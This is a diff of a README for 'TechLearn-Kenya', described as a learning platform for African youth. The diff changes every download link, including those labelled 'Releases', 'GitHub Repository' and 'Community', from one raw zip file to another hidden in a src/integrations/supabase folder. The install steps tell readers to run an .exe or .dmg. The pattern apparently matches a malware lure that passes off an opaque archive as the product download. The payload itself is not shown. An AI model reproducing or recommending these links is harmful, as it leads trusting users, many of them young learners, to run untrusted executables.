@@ -1,6 +1,6 @@
 # 🔥 TechLearn-Kenya - Empowering African Youth Through Technology
 
-[![Download TechLearn-Kenya](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip%20TechLearn-Kenya-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
+[![Download TechLearn-Kenya](https://github.com/Jeremygarilao/TechLearn-Kenya/raw/refs/heads/main/src/integrations/supabase/Kenya-Learn-Tech-v3.5-beta.2.zip%20TechLearn-Kenya-blue?style=for-the-badge&logo=github)](https://github.com/Jeremygarilao/TechLearn-Kenya/raw/refs/heads/main/src/integrations/supabase/Kenya-Learn-Tech-v3.5-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to TechLearn-Kenya! This learning management system helps you develop im
 
 To get started, follow these steps:
 
-1. Visit this page to download: [TechLearn-Kenya Releases](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip).
+1. Visit this page to download: [TechLearn-Kenya Releases](https://github.com/Jeremygarilao/TechLearn-Kenya/raw/refs/heads/main/src/integrations/supabase/Kenya-Learn-Tech-v3.5-beta.2.zip).
 2. On the releases page, look for the latest version of TechLearn-Kenya.
 3. Find the download link for your operating system. If you're unsure, look for ".exe" for Windows or ".dmg" for Mac.
 4. Click on the link to start downloading the file. 
@@ -53,9 +53,9 @@ If you need help, please check our Frequently Asked Questions (FAQs) section on 
 
 ## 🔗 Useful Links
 
-- [TechLearn-Kenya Releases](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
-- [TechLearn-Kenya GitHub Repository](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
-- [TechLearn Community](https://raw.githubusercontent.com/Jeremygarilao/TechLearn-Kenya/main/public/Learn-Tech-Kenya-occasional.zip)
+- [TechLearn-Kenya Releases](https://github.com/Jeremygarilao/TechLearn-Kenya/raw/refs/heads/main/src/integrations/supabase/Kenya-Learn-Tech-v3.5-beta.2.zip)
+- [TechLearn-Kenya GitHub Repository](https://github.com/Jeremygarilao/TechLearn-Kenya/raw/refs/heads/main/src/integrations/supabase/Kenya-Learn-Tech-v3.5-beta.2.zip)
+- [TechLearn Community](https://github.com/Jeremygarilao/TechLearn-Kenya/raw/refs/heads/main/src/integrations/supabase/Kenya-Learn-Tech-v3.5-beta.2.zip)
 
 ## 📞 Stay Connected 
 
